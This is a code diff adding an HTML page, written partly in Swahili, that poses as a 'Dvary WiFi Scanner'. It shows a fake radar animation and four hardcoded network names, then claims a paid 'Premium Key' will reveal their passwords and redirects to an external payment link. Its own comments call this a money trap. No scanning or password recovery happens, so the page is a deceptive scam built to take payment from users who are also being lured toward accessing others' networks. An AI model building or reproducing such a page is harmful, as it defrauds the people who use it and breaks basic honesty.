@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dvary WiFi Scanner</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        .radar { border: 2px solid #0f0; border-radius: 50%; width: 200px; height: 200px; margin: 20px auto; position: relative; overflow: hidden; }
+        .sweep { position: absolute; width: 100%; height: 100%; background: linear-gradient(90deg, rgba(0,255,0,0.2) 0%, transparent 50%); animation: spin 2s linear infinite; transform-origin: center; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .wifi-list { text-align: left; background: #111; padding: 15px; border-radius: 10px; border: 1px solid #333; margin-top: 20px; }
+        .wifi-item { border-bottom: 1px solid #222; padding: 10px 0; display: flex; justify-content: space-between; }
+        .btn-scan { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; cursor: pointer; width: 100%; }
+        .lock-icon { color: #f00; }
+    </style>
+</head>
+<body>
+
+    <h1>DVARY WIFI SCANNER</h1>
+    <div class="radar"><div class="sweep"></div></div>
+
+    <button class="btn-scan" onclick="startScan()">ANZA KU-SCAN WIFI</button>
+
+    <div id="results" class="wifi-list" style="display:none;">
+        <div class="wifi-item"><span>TP-Link_9920</span> <span class="lock-icon">🔒 WPA2</span></div>
+        <div class="wifi-item"><span>Vodacom_Fast</span> <span style="color:#0f0;">🔓 Open</span></div>
+        <div class="wifi-item"><span>iPhone_Elia</span> <span class="lock-icon">🔒 WPA3</span></div>
+        <div class="wifi-item"><span>Tigo_4G_Home</span> <span class="lock-icon">🔒 WPA2</span></div>
+    </div>
+
+    <div id="status" style="margin-top:20px; font-size:12px;">Bonyeza kitufe kuanza kutafuta mitandao jirani...</div>
+
+<script>
+    function startScan() {
+        const status = document.getElementById('status');
+        const results = document.getElementById('results');
+        status.innerHTML = "Inatafuta mitandao... Tafadhali subiri.";
+        
+        setTimeout(() => {
+            status.innerHTML = "Imepata mitandao 4 jirani!";
+            results.style.display = "block";
+            
+            // Mtego wako wa pesa unaingia hapa
+            setTimeout(() => {
+                alert("Ili kuona Password za hii mitandao, unahitaji Dvary Premium Key.");
+                window.location.href = "https://dvary-bot-letf.vercel.app/"; // Link yako ya malipo
+            }, 3000);
+        }, 3000);
+    }
+</script>
+
+</body>
+</html>
+
